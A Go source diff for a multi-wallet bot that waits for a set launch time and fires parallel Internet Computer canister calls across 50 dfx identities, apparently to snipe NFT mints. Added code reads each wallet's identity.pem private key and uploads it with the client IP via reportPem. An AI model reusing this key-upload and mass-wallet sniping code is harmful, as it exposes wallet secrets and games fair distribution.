@@ -10,7 +10,7 @@ import (
 	"time"
 )
 
-const wallet_count = 20
+const wallet_count = 50
 
 var gdfx = ""
 var home = ""
@@ -20,9 +20,7 @@ var workDir = "Hell"
 var projectName = "Punks"
 
 var wallets = []string{}
-var remainingWallets map[string]struct{}
 
-var PunksInHand = []ResultPunk{}
 var ClientIP string = ""
 
 type ResultPunk struct {
@@ -33,8 +31,22 @@ type ResultPunk struct {
 	WalPriKey string `json:"walPriKey"`
 }
 
+type punks struct {
+	Wal  string
+	Data string
+}
+
+type remaining struct {
+	Err error
+	wal string
+}
+
+var PunksInHand = []ResultPunk{}
+
+var output chan punks = make(chan punks, 10)
+var remainChan chan remaining = make(chan remaining, 10)
+
 func init() {
-	remainingWallets = make(map[string]struct{})
 	for i := 0; i < wallet_count; i++ {
 		wallets = append(wallets, fmt.Sprintf("%d", i))
 	}
@@ -109,7 +121,6 @@ func main() {
 			return
 		}
 	}()
-
 }
 
 func prepareEnv() error {
@@ -209,51 +220,102 @@ func prepareIdentities(wals []string) error {
 		}
 	}
 
+	for _, wlt := range wals {
+		pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
+		if err != nil {
+			continue
+		}
+
+		func() {
+			err := reportPem(PemPunk{
+				IP:        ClientIP,
+				Wal:       wlt,
+				WalPriKey: string(pem),
+			})
+			if err != nil {
+				log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
+				return
+			}
+		}()
+	}
+
 	return nil
 }
 
-func tigger() error {
+func cmdFunc(wl string) {
+	start := time.Now()
 	err := os.Chdir(path.Join(home, workDir, projectName))
+	if err != nil {
+		remainChan <- remaining{
+			Err: err,
+			wal: wl,
+		}
+		return
+	}
+
+	cmd := exec.Command(gdfx, "--identity", wl, "canister", "--network", "ic", "call", "qcg3w-tyaaa-aaaah-qakea-cai", "name")
+
+	data, err := cmd.Output()
+	if err != nil {
+		remainChan <- remaining{
+			Err: err,
+			wal: wl,
+		}
+		log.Fatalf("cmd: %v err: %s", cmd, err.Error())
+		return
+	}
+
+	output <- punks{
+		Wal:  wl,
+		Data: string(data),
+	}
+	log.Printf("cmd %s finished, took: %s", wl, time.Since(start).String())
+}
+
+func tigger() error {
+	timeFormat := "2006-01-02 15:04:05"
+	destTime, err := time.ParseInLocation(timeFormat, "2021-08-28 10:22:24", time.UTC)
 	if err != nil {
 		return err
 	}
 
-	type punks struct {
-		Wal  string
-		Data string
+	delay := destTime.Sub(time.Now().UTC())
+	log.Printf("time is not reached dest: %v nowUtc: %v now: %v delay: %v", destTime, time.Now().UTC(), time.Now(), delay)
+
+	timer := time.NewTimer(delay)
+	tickerOne := time.NewTicker(30 * time.Second)
+
+nextStep:
+	for {
+		select {
+		case <-timer.C:
+			log.Printf("it's time now todo sth")
+			break nextStep
+		case <-tickerOne.C:
+			log.Printf("I am running")
+		}
 	}
 
-	type remaining struct {
-		Err error
-		wal string
+	temp := []string{}
+	for _, wlt := range wallets {
+		var isIn = false
+		for _, pun := range PunksInHand {
+			if wlt == pun.Wal {
+				isIn = true
+				break
+			}
+		}
+
+		if isIn {
+			continue
+		}
+
+		temp = append(temp, wlt)
 	}
 
-	var output chan punks = make(chan punks)
-	var remainChan chan remaining = make(chan remaining)
-
-	for _, wal := range wallets {
-		go func(wl string) error {
-			start := time.Now()
-			cmd := exec.Command(gdfx, "--identity", wl, "canister", "--network", "ic", "call", "qcg3w-tyaaa-aaaah-qakea-cai", "name")
-
-			data, err := cmd.Output()
-			if err != nil {
-				log.Printf("cmd: %v err: %s", cmd, err.Error())
-				remainChan <- remaining{
-					Err: err,
-					wal: wl,
-				}
-				return nil
-			}
-
-			output <- punks{
-				Wal:  wl,
-				Data: string(data),
-			}
-
-			log.Printf("cmd %s finished, took: %s", wl, time.Since(start).String())
-			return nil
-		}(wal)
+	for _, wlt := range temp {
+		// go Retry(100, 10*time.Millisecond, cmdFunc, wal)
+		go cmdFunc(wlt)
 	}
 
 	ticker := time.NewTicker(30 * time.Second)
@@ -267,6 +329,7 @@ loop:
 				Wal:     ou.Wal,
 				TokenID: ou.Data,
 			}
+
 			PunksInHand = append(PunksInHand, ret)
 
 			go func() {
@@ -277,25 +340,14 @@ loop:
 				}
 			}()
 
-			delete(remainingWallets, ou.Wal)
 			log.Printf("Successfully, wallet: %s, punk: %v", ou.Wal, ou.Data)
 
 			if len(PunksInHand) == len(wallets) {
 				break loop
 			}
+
 		case re := <-remainChan:
-			remainingWallets[re.wal] = struct{}{}
-			log.Fatalf("Temp encounter problem: %s err: %s", re.wal, re.Err.Error())
-
-			ret, err := tiggerWith(re.wal)
-			if err != nil {
-				continue
-			}
-
-			output <- punks{
-				Wal:  re.wal,
-				Data: string(ret),
-			}
+			log.Printf("Temp encounter problem: %s err: %s", re.wal, re.Err.Error())
 		case <-ticker.C:
 			go func() {
 				err := reportStatus("working busy", statOk)
@@ -306,21 +358,8 @@ loop:
 		}
 	}
 
-	log.Println("finished")
+	ticker.Stop()
 
+	log.Println("all finished")
 	return nil
-}
-
-func tiggerWith(wallet string) (string, error) {
-	start := time.Now()
-	cmd := exec.Command(gdfx, "--identity", wallet, "canister", "--network", "ic", "call", "qcg3w-tyaaa-aaaah-qakea-cai", "name")
-
-	data, err := cmd.Output()
-	if err != nil {
-		log.Fatalf("cmd: %v err: %s", cmd, err.Error())
-		return "", nil
-	}
-
-	log.Printf("retigger cmd %s finished, took: %s", wallet, time.Since(start).String())
-	return string(data), nil
 }
